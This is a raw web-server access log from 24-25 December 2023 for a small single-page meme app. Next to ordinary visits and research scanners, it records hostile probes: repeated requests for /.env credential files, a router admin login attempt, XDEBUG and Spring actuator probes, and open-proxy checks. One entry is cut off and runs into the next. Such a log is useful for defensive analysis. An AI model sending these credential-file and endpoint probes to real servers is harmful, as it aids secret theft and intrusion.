78.153.140.221 - - [24/Dec/2023:16:58:30 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
78.153.140.221 - - [24/Dec/2023:16:59:21 +0000] "POST /.env HTTP/1.1" 404 144 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.108 - - [24/Dec/2023:17:09:28 +0000] "GET http://eth0.me?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
95.214.235.169 - - [24/Dec/2023:17:24:13 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [24/Dec/2023:17:24:14 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
177.155.134.161 - - [24/Dec/2023:17:29:30 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /static/css/main.b1d60193.chunk.css HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /static/js/main.e4532f1e.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /static/js/2.f5e8e300.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /logo2.jpeg HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /api/sessions/current HTTP/1.1" 401 37 "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:17:30:34 +0000] "GET /api/memes HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit79.13.248.116 - - [24/Dec/2023:18:35:57 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:35:57 +0000] "GET /manifest.json HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:35:57 +0000] "GET /static/css/main.b1d60193.chunk.css HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:35:57 +0000] "GET /static/js/2.f5e8e300.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:35:57 +0000] "GET /static/js/main.e4532f1e.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:03 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:03 +0000] "GET /manifest.json HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:03 +0000] "GET /static/css/main.b1d60193.chunk.css HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:03 +0000] "GET /static/js/main.e4532f1e.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:03 +0000] "GET /static/js/2.f5e8e300.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET / HTTP/1.1" 304 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /static/css/main.b1d60193.chunk.css HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /static/js/2.f5e8e300.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /static/js/main.e4532f1e.chunk.js HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /logo2.jpeg HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /api/sessions/current HTTP/1.1" 401 37 "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
79.13.248.116 - - [24/Dec/2023:18:36:11 +0000] "GET /api/memes HTTP/1.1" 304 - "http://34.154.152.81/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
90.151.171.106 - - [24/Dec/2023:18:51:38 +0000] "GET http://fingerprints.bablosoft.com/ip?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
84.54.51.80 - - [24/Dec/2023:18:56:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 163 "http://34.154.152.81:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
69.164.217.74 - - [24/Dec/2023:18:57:39 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.104 - - [24/Dec/2023:18:57:58 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
185.224.128.191 - - [24/Dec/2023:19:29:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
50.118.225.160 - - [24/Dec/2023:19:43:59 +0000] "GET / HTTP/1.0" - - "-" "-"
50.118.225.160 - - [24/Dec/2023:19:44:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "D7j7lraJD8L8NDj"
50.118.225.160 - - [24/Dec/2023:19:44:03 +0000] "GET / HTTP/1.1" 200 3230 "-" "8N4bGgVk5YRha5d"
50.118.225.160 - - [24/Dec/2023:19:44:04 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "WFjFt5eSjfBj4wP"
169.150.196.4 - - [24/Dec/2023:19:44:05 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "pYfoEDDscJGr8U4"
107.189.14.106 - - [24/Dec/2023:19:44:23 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "jhdU8QtLhSPxd5B"
107.189.14.106 - - [24/Dec/2023:19:44:35 +0000] "DELETE / HTTP/1.1" 404 142 "-" "Hp79BtxrZZBUfAa"
5.255.118.104 - - [24/Dec/2023:19:44:47 +0000] "DELETE / HTTP/1.1" 404 142 "-" "Hp79BtxrZZBUfAa"
35.190.199.12 - - [24/Dec/2023:20:06:29 +0000] "GET / HTTP/1.1" 200 3230 "-" "python-requests/2.31.0"
90.151.171.106 - - [24/Dec/2023:20:43:23 +0000] "GET http://v4.ident.me?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
92.194.87.162 - - [24/Dec/2023:21:08:06 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
83.97.73.87 - - [24/Dec/2023:21:53:55 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
198.235.24.206 - - [24/Dec/2023:22:01:38 +0000] "GET / HTTP/1.0" 200 3230 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
172.104.210.105 - - [24/Dec/2023:22:20:31 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [24/Dec/2023:22:21:21 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
83.97.73.87 - - [24/Dec/2023:22:39:34 +0000] "GET /actuator/gateway/routes HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.163.53 - - [24/Dec/2023:22:44:28 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.13 - - [24/Dec/2023:22:44:46 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
95.214.235.169 - - [24/Dec/2023:23:26:06 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [24/Dec/2023:23:26:06 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.217.74 - - [24/Dec/2023:23:26:50 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.33.80.243 - - [24/Dec/2023:23:27:13 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
45.79.168.172 - - [25/Dec/2023:00:07:18 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [25/Dec/2023:00:07:34 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
205.210.31.30 - - [25/Dec/2023:00:32:03 +0000] "GET / HTTP/1.1" 200 3230 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
69.164.217.245 - - [25/Dec/2023:00:55:06 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.13 - - [25/Dec/2023:00:56:11 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
192.155.88.231 - - [25/Dec/2023:00:59:58 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.220 - - [25/Dec/2023:01:00:12 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
69.164.217.74 - - [25/Dec/2023:01:06:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.251 - - [25/Dec/2023:01:11:39 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
198.74.56.46 - - [25/Dec/2023:01:18:33 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.118 - - [25/Dec/2023:01:18:54 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
23.235.171.243 - - [25/Dec/2023:01:24:20 +0000] "GET http://nstool.netease.com/?_229943489332950275181108654692580 HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
205.210.31.35 - - [25/Dec/2023:02:05:40 +0000] "GET / HTTP/1.0" 200 3230 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
162.216.149.108 - - [25/Dec/2023:02:06:34 +0000] "GET / HTTP/1.1" 200 3230 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
54.37.79.75 - - [25/Dec/2023:02:18:02 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:02:18:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:02:25:14 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:02:25:15 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.108 - - [25/Dec/2023:02:51:06 +0000] "GET http://eth0.me?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
192.155.88.231 - - [25/Dec/2023:02:56:35 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.118 - - [25/Dec/2023:02:57:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
54.193.12.78 - - [25/Dec/2023:03:30:43 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:03:40:30 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:03:40:30 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.106.29.122 - - [25/Dec/2023:03:42:18 +0000] "GET / HTTP/1.0" 200 3230 "-" "Mozilla/5.0"
64.62.197.101 - - [25/Dec/2023:03:43:55 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41"
64.62.197.97 - - [25/Dec/2023:03:45:40 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
64.62.197.94 - - [25/Dec/2023:03:46:21 +0000] "GET /geoserver/web/ HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.41"
69.164.217.245 - - [25/Dec/2023:04:04:01 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.172.21 - - [25/Dec/2023:04:04:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
52.144.45.49 - - [25/Dec/2023:04:51:16 +0000] "GET / HTTP/1.1" 200 3230 "-" "python-requests/2.21.0"
54.37.79.75 - - [25/Dec/2023:05:03:13 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:05:03:13 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
68.69.186.30 - - [25/Dec/2023:05:14:05 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
87.236.176.175 - - [25/Dec/2023:05:32:24 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.143 - - [25/Dec/2023:05:32:25 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
87.236.176.182 - - [25/Dec/2023:05:32:25 +0000] "GET /logo192.png HTTP/1.1" 200 5347 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
54.37.79.75 - - [25/Dec/2023:05:34:07 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:05:34:07 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
90.151.171.106 - - [25/Dec/2023:05:35:34 +0000] "GET http://fingerprints.bablosoft.com/ip?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
95.214.235.169 - - [25/Dec/2023:05:40:10 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:05:40:12 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
198.50.207.20 - - [25/Dec/2023:05:44:04 +0000] "GET / HTTP/1.0" - - "-" "-"
198.50.207.20 - - [25/Dec/2023:05:44:32 +0000] "GET / HTTP/1.1" 200 3230 "-" "5uHYrPxFIt9xMfI"
185.241.208.232 - - [25/Dec/2023:05:45:15 +0000] "GET / HTTP/1.1" 200 3230 "-" "zSpZZvT5efxJ90v"
185.241.208.232 - - [25/Dec/2023:05:45:16 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "NwDEHy1O117BXas"
5.42.80.232 - - [25/Dec/2023:05:46:12 +0000] "GET / HTTP/1.1" 200 3230 "-" "3Gmg7gXJYf8r52l"
45.138.16.230 - - [25/Dec/2023:05:46:47 +0000] "GET / HTTP/1.1" 200 3230 "-" "5qvmKpJv5vioBEN"
45.138.16.240 - - [25/Dec/2023:05:46:55 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "lzIe2yPzW2fM95h"
45.138.16.240 - - [25/Dec/2023:05:46:55 +0000] "GET /robots.txt HTTP/1.1" 200 67 "-" "vfdoV8LWCdIpGph"
45.9.150.130 - - [25/Dec/2023:05:47:01 +0000] "HEAD / HTTP/1.1" 200 3230 "-" "Ltov4S7hFvpqbZB"
45.9.150.130 - - [25/Dec/2023:05:47:01 +0000] "DELETE / HTTP/1.1" 404 142 "-" "AmsUWMXbpWRbi95"
198.74.56.46 - - [25/Dec/2023:06:13:12 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [25/Dec/2023:06:14:11 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
68.69.186.30 - - [25/Dec/2023:06:26:26 +0000] "GET / HTTP/1.1" 200 3230 "-" "-"
45.79.168.172 - - [25/Dec/2023:07:03:22 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
192.155.90.118 - - [25/Dec/2023:07:03:37 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
162.216.149.25 - - [25/Dec/2023:07:14:11 +0000] "GET / HTTP/1.1" 200 3230 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.155.88.231 - - [25/Dec/2023:07:15:40 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
172.105.128.11 - - [25/Dec/2023:07:16:14 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
90.151.171.106 - - [25/Dec/2023:07:31:17 +0000] "GET http://checkip.amazonaws.com?Z71886550850Q1 HTTP/1.1" 200 3230 "https://google.com/" "Mozilla/5.0 (Windows NT 6.1; rv:16.0) Gecko/20100101 Firefox/16.0 (+https://best-proxies.ru/faq/#from)"
54.37.79.75 - - [25/Dec/2023:07:44:00 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:07:44:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.163.53 - - [25/Dec/2023:07:48:04 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.223 - - [25/Dec/2023:07:48:21 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
71.6.232.20 - - [25/Dec/2023:08:05:09 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
185.224.128.191 - - [25/Dec/2023:08:06:17 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.235.169 - - [25/Dec/2023:08:29:36 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
95.214.235.169 - - [25/Dec/2023:08:29:36 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:08:32:57 +0000] "GET /.env HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [25/Dec/2023:08:32:57 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.168.172 - - [25/Dec/2023:08:40:34 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 zgrab/0.x"
45.79.128.205 - - [25/Dec/2023:08:41:24 +0000] "GET / HTTP/1.1" 200 3230 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
